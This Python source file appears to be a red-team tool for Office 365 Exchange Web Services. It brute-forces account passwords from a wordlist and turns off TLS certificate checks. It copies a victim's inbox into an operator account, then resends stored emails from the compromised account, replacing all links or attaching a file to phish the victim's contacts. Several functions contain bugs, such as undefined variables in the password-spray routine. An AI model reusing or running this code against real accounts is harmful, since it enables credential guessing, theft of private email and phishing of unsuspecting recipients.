
"""
Drew Emond

--
MIT License
Copyright (c) [year] [fullname]
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.
    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.
"""

import click
import sys
import re
import getpass
from exchangelib import Account, Folder, Credentials, Configuration, DELEGATE, Message, FileAttachment, \
    ItemAttachment, Mailbox, HTMLBody, errors
from exchangelib.errors import UnauthorizedError, CASError
import random
# Comment this out to validate certs
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from exchangelib.protocol import BaseProtocol, NoVerifyHTTPAdapter
import requests.utils
BaseProtocol.HTTP_ADAPTER_CLS = NoVerifyHTTPAdapter

def _new_user_agent(name=False):
    """Returns a random custom user agent based on the list below:

    :param name: (Boolean) honestly, have no idea what this does. Consult exchangelib docs...
    :return:     (string)  returns the user agent that was randomly chosen
    """
    ua = ['Mozilla/5.0 (Sus NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36',
          'Mozilla/5.0 (Sus NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36',
          'Mozilla/5.0 (Sus NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0',
          'Mozilla/5.0 (Sus NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',
          'Mozilla/5.0 (Hacintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36'
          'Mozilla/5.0 (Hacintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7']
    return random.choice(ua)

requests.utils.default_user_agent = _new_user_agent

class Session:
    """Contains all of the pertinant information to initialize an Outlook Session

    """
    red_username      = ''
    red_domain        = ''
    red_password      = ''
    red_full_username = ''
    _red_account      = ''

    def __init__(self, domain, username, password=''):
        """Creates a Session object

        :param nDomain:      (String) The domain that is being authenticated to (ie. Champlain.edu)
        :param username:     (String) The username(s) that are going to be used to login
        :param password:     (String) The password(s) that are going to be used to login
        """

        self.domain            = domain
        self.username          = username
        self.password          = password
        self.full_username     = username + '@' + domain

        self.emails            = []

        self._validated_cred   = False
        self._victim_account   = self.set_vic_account()

        if(Session.red_username == ''):
            Session.set_red_account()

    def set_vic_account(self):
        """Authenticates with EWS using the existing credentials.

        NOTE: _victim_account will be 'None' if the possword was invalid. self._validated_cred will say whether or not that password is legit.

        :return: (Account) returns the account from EWS that was authenticated with given creds
        """
        is_valid_account, account = self.test_single_mode(self.username, self.domain, self.password)

        if is_valid_account:
            self._validated_cred = True
        else:
            self._validated_cred = False
        return account

    def pass_spray(self, pass_file):
        """Use a password file to try to brute force the given account.

        :param username:  (string)  The username of the account to be bruteforced
        :param pass_file: (string)  The filename of the password list to use

        :return:          (Boolean) Whether or not password was succesfully bruteforced.
        """

        found = False
        with open(pass_file) as pass_list:
            count = 1
            for password in pass_list:
                valid = self.test_single_mode(self.username, domain, password.rstrip('\r\n'))
                if valid:
                    found = True
                    print(username + "'s password is: " + password)

                    # update objects
                    self.password        = password
                    self._validated_cred = True
                    return True

                else:
                    print(str(count) + 'Password: ' + password + ' Failed')

                count+=1
        return False

    def attach_file(self, message, file_path, file_name):
        """Attaches a given file to a given message, and names as specified.

        :param message:   (Message) A message object (from exchangelib) that you wish to attach a file to
        :param file_path: (String)  A string containing the filepath of the file you wish to attach
        :param file_name: (String)  A string that specifies what you want the reciever to see as the name of the file
        :return:          (Message) The message with a new file attachment
        """

        attachment = ''

        with open(file_path, 'rb') as f:
            attachment = FileAttachment(name=file_name, content=f.read())
            message.attach(attachment)

        return message

    def search_keyword(self, keyword, folder="inbox"):
        """Searches the current Inbox for emails that contain the 'keyword' in the bodys.

            :param keyword: (string)    keyword to search the Inbox for
            :param folder:  (string) (default Inbox) A string containing the folder to be searched.
            :return emails: [(Message)] A list of 'Message' objects that contain the keyword.
        """
        try:
            emails = []
            for item in self._victim_account.inbox.all():
                if(keyword in item.body):
                    emails.append(item)
                    print(item.subject)
            return emails
        except:
            print("Error")

    def get_num_emails(self, number=10, folder="inbox"):
        """This method gets the last 'number' of emails from the outlook folder "folder" in the active sessionself.

        :param number: (int)    (default 10)    the number of emails to investigate
        :param folder: (string) (default Inbox) A string containing the folder to be searched.
        """
        try:
            emails = []
            count = 0
            for item in self._victim_account.inbox.all():
                if count >= number:
                    break
                else:
                    emails.append(item)
                    count += 1

            return emails
        except:
            print("Error")

    def vic_download_emails(self, number=10, keyword='', folder="inbox"):
        """This method searches the authenticated user's inbox for the last 'number' of
            emails that match the 'keyword' and stores them in the instance.

            :param number:          (int)    (default 10)    the number of emails to investigate
            :param keyword:         (string) (default null)  the keyword, if any to search emails for
            :param folder:          (string) (default Inbox) A string containing the folder to be searched.
        """
        if keyword:
            print("Searching for Keyword....")
            self.emails = self.search_keyword(keyword, folder)
        else:
            print("Searching for Num....")
            self.emails = self.get_num_emails(number, folder)

    def _build_folder(self, main_folder):
        """Builds folder tree for email
            username@domain
                [inbox
                [to_send

            :param main_folder: (string) The address that will be the NAME of the new folder (NOT THE ACCOUNT THAT THE NEW FOLDER WILL BE MADE IN)
            :return: (folder,folder) Returns two folders: inbox folder, tosend folder
        """
        # This will hold the folder object
        f = ''

        #Check for matching folders:
        # We are going to assume that there are two subfolders (inbox, to_send) if the folder already exists. If the folder is
        #    made in this script, then that will be the case
        f_inbox = ""
        f_tosend = ""

        print("The main_folder is: " + main_folder)
        for item in self._red_account.inbox.glob(main_folder):
            # If the folder exists, set the target folders to the ones that are already there.
            if item.name == main_folder:
                f = item

                for kid in f.children:
                    if kid.name == "inbox":
                        f_inbox = kid
                    elif kid.name == "to_send":
                        f_tosend = kid

                return f_inbox, f_tosend

        # If the folder doesn't exist, then make it, and it's subfolders
        f = Folder(parent=self._red_account.inbox, name=main_folder)
        f.save()

        f_inbox = Folder(parent=f, name="inbox")
        f_inbox.save()
        f_tosend = Folder(parent=f, name="to_send")
        f_tosend.save()


        return f_inbox, f_tosend

    def red_upload_emails(self):
        """This method uploads emails from self.emails, to the folder specific to the victim.
        """

        sub_inbox, to_send = self._build_folder(self.full_username)


        # Copy all of the saved messages into the specified folder
        for email in self.emails:
            print(email.sender)

            m = Message(
                account=Session._red_account,
                folder=sub_inbox,
                subject=email.subject,
                body=email.body,
                to_recipients=[email.sender]
                )
            m.save()

    def vic_send_emails(self, emails):
        """This method uploads emails from a list, and sends them.

            :param emails: (list[Messages]) A list of Message objects.
        """

        # Copy all of the saved messages into the specified folder
        for email in emails:
            print('Sending: "' + email.subject + '" to ' + str(email.to_recipients))
            email.send()

    def send_phishing_email(self, link_replace=True, link='https://www.basspro.com', attach_file=False, file_path='', file_name='Resume'):
        """Send phishing emails from a compromised account.

        :param link_replace: (Boolean)    if you want to replace the links in the email or not
        :param link:         (String)     if you do want to link replace, this is the link that will replace all of the existing links
        :param attatch_file: (Boolean)    if you want to attach a file or not
        :param file_path:    (String)     if you want to attach a file, the path of the desired file
        :param file_name:    (String)     if you want to attach a file, the name that you want the reciever to see
        """

        # Find the correct folder in the red_account
        old_emails = []
        for folder in self._red_account.inbox.children:

            if folder.name == self.full_username:
                for sub_folder in folder.children:
                    if sub_folder.name == "to_send":
                        old_emails = [email for email in sub_folder.all()]
                        break
                break

        # Iterate through emails and either replace links or attach files
        new_emails = []
        for email in old_emails:
            m = Message(
                account=self._victim_account,
                subject=email.subject,
                body=email.body,
                to_recipients=email.to_recipients
                )

            # Replace links
            if link_replace:
                replace_string = 'href="' + link + '"'
                m.body = HTMLBody(re.sub(r'href="\S*"', replace_string, m.body))

            # Attach file
            if attach_file:
                m = self.attach_file(m, file_path, file_name)

            new_emails.append(m)

        print("Sending emails from the victim... ")


        self.vic_send_emails(new_emails)

    @classmethod
    def ews_config_setup(cls, user, domain, password):
        """Authenticates with Outlook EWS and returns the account objected created with the passed credentials.
        (From: "https://github.com/mikesiegel/ews-crack")

        :param user:     (String) the user you wish to authenticate, (for the email 'test@testing.com', just pass 'test' as the user)
        :param domain:   (String) the domain of the user to authenticate
        :param password: (String) the password of the user to authenticate

        :return:         (Account,Config) returns the account object returned from EWS and the config details
        """
        try:
            config = Configuration(
                server='outlook.office365.com/EWS/Exchange.asmx',
                credentials=Credentials(
                    username="{}@{}".format(user, domain),
                    password=password))

            account = Account(
                primary_smtp_address="{}@{}".format(user, domain),
                autodiscover=False,
                config=config,
                access_type=DELEGATE)

        except UnauthorizedError:
            print("Bad password")
            return None, None

        except CASError:
            print("CAS Error: User {} does not exist.".format(user))
            return None, None

        return account, config

    @classmethod
    def set_red_account(cls):
        """Authenticates with EWS using the initialized red team credentials.

        NOTE: It is vital that you have a red team account to use this script.
              You will not be able to continue until you have entered valid credentials.

        """
        while(True):
            print("No Red_Team account provided. Let's configure that: ")
            temp_username = raw_input("What is the username? (Just before the '@'): ")
            temp_domain   = raw_input("What is the domain? (ie google.com): ")
            temp_password = raw_input("What is the password: ")

            is_valid_account, account = cls.test_single_mode(temp_username, temp_domain, temp_password)

            if not is_valid_account:
                print("The Red Team credentials that you passed are invalid. These are required for this script. ")
                print("Please try again. ")
            else:
                cls.red_username      = temp_username
                cls.red_domain        = temp_domain
                cls.red_password      = temp_password
                cls.red_full_username = temp_username + '@' + temp_domain
                cls._red_account      = account
                return

    # TODO: Throw an error here instead of bad pass
    @classmethod
    def test_single_mode(cls, username, domain, password):
        """Attempts to login to an account using a single username/password.
        (From: "https://github.com/mikesiegel/ews-crack")

        :param username: (string)  the username of the account to login as
        :param password: (string)  the password of the account to login as
        :return:         (Boolean) return a Boolean reflecting whether the account exists or not
        :return:         (Account) return the account, this will be 'None' if the password was invalid
        """
        account, config = cls.ews_config_setup(username, domain, password)
        if account is None and config is None:
            return False, account
        else:
            #next(iter(account.inbox.all())) # Not really sure what this line does....
            return True, account
